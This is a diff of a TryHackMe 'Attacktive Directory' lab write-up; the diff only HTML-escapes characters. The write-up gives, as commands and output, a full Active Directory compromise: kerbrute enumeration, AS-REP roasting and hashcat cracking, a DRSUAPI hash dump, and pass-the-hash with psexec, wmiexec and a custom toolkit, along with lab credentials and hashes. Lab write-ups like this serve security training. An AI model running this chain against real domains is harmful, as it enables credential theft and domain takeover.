@@ -39,7 +39,7 @@ an llm was used during the session: for looking up CVE details, interpreting raw
 
 ## Preface
 
-room done from my Kali virtualised on Linux Mint, TryHackMe VPN with sudo openvpn --config ~/thm.ovpn and verification with ip a show tun0.
+room done from my Kali virtualised on Linux Mint, TryHackMe VPN with sudo openvpn &#45;&#45;config ~/thm.ovpn and verification with ip a show tun0.
 time estimated by the room 90 minutes, my declared goal was to close it in 30. I didn't manage it, but not because of the technical difficulty: the chain itself is linear and has no obscure steps. the time went almost entirely into operational friction, and that's the thing I take away from this session more than the flags
 the infrastructure was awful: practically every command towards the target timed out on the first attempt and went through on the second identical one, and halfway through the room the machine died outright (ping 100% packet loss, services silent), forcing a restart of the lab machine and an IP change from 10.113.168.168 to 10.113.182.0. the wmiexec shell dropped three times,two of them on trivial commands.
 plus two preparation mistakes of my own: kerbrute downloaded but not in PATH, and the two wordlists provided by the room which I thought I had downloaded and which had in fact never arrived on the machine.
@@ -51,11 +51,11 @@ I had also considered using an AD tool I wrote myself at the opening, but I disc
 
 first full scan, it plants itself on the opening line and doesn't move:
 
-nmap -sV -sC -Pn -p- --min-rate 1000 -oN nmap_attacktive.txt 10.113.168.168
+nmap -sV -sC -Pn -p- &#45;&#45;min-rate 1000 -oN nmap_attacktive.txt 10.113.168.168
 
 I interrupt it (here Ctrl+C is safe, it's a normal shell, not a reverse one) and switch to a scan targeted only at the ports typical of an Active Directory environment. this choice isn't mine: the room introduction explicitly says to concentrate on AD and nothing else, and with 90 minutes estimated and a slow target there's no sense in spending ten minutes on 65535 ports to find what you already know is there.
 
-nmap -sV -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 --min-rate 1000 -oN nmap_ad_fast.txt 10.113.168.168
+nmap -sV -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 &#45;&#45;min-rate 1000 -oN nmap_ad_fast.txt 10.113.168.168
 
 Result:
 
@@ -71,18 +71,18 @@ Result:
 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
 3269/tcp open  tcpwrapped
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
-| rdp-ntlm-info: 
-|   Target_Name: THM-AD
-|   NetBIOS_Domain_Name: THM-AD
-|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
-|   DNS_Domain_Name: spookysec.local
-|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
-|   Product_Version: 10.0.17763
+&#124; ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+&#124; rdp-ntlm-info: 
+&#124;   Target_Name: THM-AD
+&#124;   NetBIOS_Domain_Name: THM-AD
+&#124;   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+&#124;   DNS_Domain_Name: spookysec.local
+&#124;   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+&#124;   Product_Version: 10.0.17763
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
+&#124; smb2-security-mode: 
+&#124;   3.1.1: 
+&#124;_    Message signing enabled and required
 
 port by port, why I pursue it or rule it out:
 
@@ -117,13 +117,13 @@ with 88 open the right tool is kerbrute, which enumerates valid users by sending
 
 first attempt:
 
-kerbrute userenum -d spookysec.local --dc 10.113.168.168 ~/userlist.txt -t 50
+kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50
 kerbrute: command not found
 
 downloaded but not in PATH. I get it from the releases and call it by path:
 
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O ~/kerbrute && chmod +x ~/kerbrute
-~/kerbrute userenum -d spookysec.local --dc 10.113.168.168 ~/userlist.txt -t 50
+~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50
 
 open /home/kali/userlist.txt: no such file or directory
 
@@ -134,7 +134,7 @@ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/
 
 I relaunch at 50 threads and it sits still for minutes without printing anything. I interrupt it and retry at 10:
 
-~/kerbrute userenum -d spookysec.local --dc 10.113.168.168 ~/userlist.txt -t 10
+~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 10
 
 2026/09/11 09:31:22 >  [+] VALID USERNAME:       james@spookysec.local
 2026/09/11 09:31:23 >  [+] VALID USERNAME:       svc-admin@spookysec.local
@@ -178,7 +178,7 @@ tunnel up, target dead. lab machine restarted, new IP 10.113.182.0. fortunately 
 
 on the new IP the single execution stays silent while it works, and not knowing whether I'm wasting time or not is the worst problem on this infrastructure. I change approach and run a loop user by user, so every line prints as soon as it finishes and the timeout doesn't block everything:
 
-for u in $(cat ~/validusers.txt); do echo "== $u"; timeout 15 impacket-GetNPUsers spookysec.local/$u -dc-ip 10.113.182.0 -no-pass -format hashcat 2>&1 | tail -3; done | tee ~/asrep.txt
+for u in $(cat ~/validusers.txt); do echo "== $u"; timeout 15 impacket-GetNPUsers spookysec.local/$u -dc-ip 10.113.182.0 -no-pass -format hashcat 2>&1 &#124; tail -3; done &#124; tee ~/asrep.txt
 
 == james
 [*] Getting TGT for james
@@ -207,15 +207,15 @@ a note on my command: the tail -3 cut off james's result line, so on that user I
 the hash prefix says $krb5asrep$23$: etype 23, that is RC4-HMAC, which corresponds to hashcat mode 18200. that's the correspondence to check, because with AES the etype and the mode would be different.
 
 grep -o '\$krb5asrep\$.*' ~/asrep.txt > ~/svcadmin.hash
-hashcat -m 18200 ~/svcadmin.hash /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 ~/svcadmin.hash /usr/share/wordlists/rockyou.txt &#45;&#45;force
 
-...:management2005
+&#46;&#46;&#46;:management2005
 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
-Time.Started.....: Fri Sep 11 09:41:44 2026, (4 secs)
-Progress.........: 5840896/14344385 (40.72%)
+Session&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;.: hashcat
+Status&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;..: Cracked
+Hash.Mode&#46;&#46;&#46;&#46;&#46;&#46;..: 18200 (Kerberos 5, etype 23, AS-REP)
+Time.Started&#46;&#46;&#46;..: Fri Sep 11 09:41:44 2026, (4 secs)
+Progress&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;: 5840896/14344385 (40.72%)
 
 four seconds on CPU. domain credentials: svc-admin / management2005
 
@@ -233,7 +233,7 @@ twice in a row. it isn't the usual infrastructure timeout: smbclient by default 
 timeout 90 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management2005' -m SMB3 -p 445
 
         Sharename       Type      Comment
-        ---------       ----      -------
+        &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-       &#45;&#45;&#45;&#45;      &#45;&#45;&#45;&#45;&#45;&#45;-
         ADMIN$          Disk      Remote Admin
         backup          Disk      
         C$              Disk      Default share
@@ -242,7 +242,7 @@ timeout 90 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management
         SYSVOL          Disk      Logon server share 
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.113.182.0 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available
+Unable to connect with SMB1 &#45;&#45; no workgroup available
 
 the final error is only the SMB1 fallback for the workgroup listing, irrelevant: the shares have already come out. six in total, five standard (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and one that has nothing to do with a clean installation: backup.
 
@@ -291,7 +291,7 @@ hypothesis one confirmed: the method is DRSUAPI, that is replication, not file r
 
 things to note from the dump, including the marginal ones:
 the LM hash is aad3b435b51404eeaad3b435b51404ee for everyone, which is the empty LM value, so LM storage is disabled. correct, and it saves me wasting time cracking them.
-a-spooks (RID 1601) has exactly the same NT hash as Administrator (0e0363...). it isn't a coincidence: it's a second administrative account with the same password. it means that even changing Administrator's password the domain would stay compromised through that account.
+a-spooks (RID 1601) has exactly the same NT hash as Administrator (0e0363&#46;&#46;&#46;). it isn't a coincidence: it's a second administrative account with the same password. it means that even changing Administrator's password the domain would stay compromised through that account.
 skidy and breakerofthings in turn share the same hash with each other, more reuse.
 there's also krbtgt's hash, which in a real engagement would be the piece for a Golden Ticket. here it isn't needed and I don't touch it, the shorter route is already open.
 
@@ -305,12 +305,12 @@ first attempt with psexec:
 
 timeout 120 impacket-psexec 'spookysec.local/administrator@10.113.182.0' -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
 
-[*] Requesting shares on 10.113.182.0.....
+[*] Requesting shares on 10.113.182.0&#46;&#46;&#46;..
 [*] Found writable share ADMIN$
 [*] Uploading file ySRWXJvY.exe
-[*] Opening SVCManager on 10.113.182.0.....
-[*] Creating service EftP on 10.113.182.0.....
-[*] Starting service EftP.....
+[*] Opening SVCManager on 10.113.182.0&#46;&#46;&#46;..
+[*] Creating service EftP on 10.113.182.0&#46;&#46;&#46;..
+[*] Starting service EftP&#46;&#46;&#46;..
 [-] Error performing the installation, cleaning up: Error occurs while reading from remote(104)
 
 two things here. the first: "Found writable share ADMIN$" is the very first alarm bell, and it's the confirmation that administrative access is real and not just an authentication that succeeded. the second: looking at the sequence you understand how noisy psexec is. it uploads a binary to the administrative share, opens the Service Control Manager, creates a service with a random name and starts it. on a monitored domain that chain is exactly what an EDR is tuned to see
@@ -365,7 +365,7 @@ with the room closed I go back to the idea discarded in Phase 2, now in the cont
 git clone https://github.com/torchiachristian/ad-attack-toolkit.git ~/ad-attack-toolkit
 cd ~/ad-attack-toolkit && python3 -m venv adtoolkit && source adtoolkit/bin/activate && pip install -r requirements.txt
 
-python3 ad_enum.py --dc-ip 10.113.182.0 --domain spookysec.local -u backup -p backup2517860
+python3 ad_enum.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup -p backup2517860
 
 [+] Connected to 10.113.182.0:389 as backup@spookysec.local
 [+] Base DN: DC=spookysec,DC=local
@@ -387,7 +387,7 @@ python3 ad_enum.py --dc-ip 10.113.182.0 --domain spookysec.local -u backup -p ba
 what it confirms: svc-admin the only NO_PREAUTH out of 17 users, zero service accounts with SPN (so Kerberoasting on this room isn't practicable, unlike my lab where it's one of the main vectors), and the two direct Domain Admins are Administrator and a-spooks, consistent with the two identical NT hashes from the dump.
 what it genuinely adds: Backup Operators has zero members. that's the piece of data that cleanly closes the alternative hypothesis from Phase 5, and confirms that the backup account's privileges were replication rights and not membership of that group. a custom group CompStaff with 12 members also comes out, which didn't emerge from any manual step.
 
-python3 pth.py --target-ip 10.113.182.0 --domain spookysec.local -u administrator --nthash 0e0363213e37b94221497260b0bcb4fc
+python3 pth.py &#45;&#45;target-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc
 
 [+] PtH authentication successful as SPOOKYSEC.LOCAL\administrator
 [+] Server OS:   Windows 10.0 Build 17763
@@ -397,7 +397,7 @@ python3 pth.py --target-ip 10.113.182.0 --domain spookysec.local -u administrato
 
 build 17763 aligned with the Product_Version read by nmap in Phase 1.
 
-python3 asreproast.py --dc-ip 10.113.182.0 --domain spookysec.local
+python3 asreproast.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local
 
 [+] Loaded 1 target from the enumeration file
   [+] svc-admin - AS-REP hash captured (etype 23 / RC4-HMAC)
@@ -406,7 +406,7 @@ etype and mode identical to the manual capture with GetNPUsers, so a double inde
 
 finally the complete assessment. I launched it passing the password through an environment variable instead of directly, because of a known bug I'm fixing:
 
-AD_PW='backup2517860' python3 ad_attack.py --dc-ip 10.113.182.0 --domain spookysec.local -u backup --all --password-env AD_PW --pth --pth-user administrator --nthash 0e0363213e37b94221497260b0bcb4fc
+AD_PW='backup2517860' python3 ad_attack.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup &#45;&#45;all &#45;&#45;password-env AD_PW &#45;&#45;pth &#45;&#45;pth-user administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc
 
 assessment completed; states={'enum': 'findings', 'asrep': 'findings', 'kerb': 'tested_no_findings', 'pth': 'findings'} counts={'asrep': 1, 'kerb': 0, 'domain_admins': 2}
 [+] PDF report: engagements/spookysec.local-20260911-101535/ad_attack_report.pdf
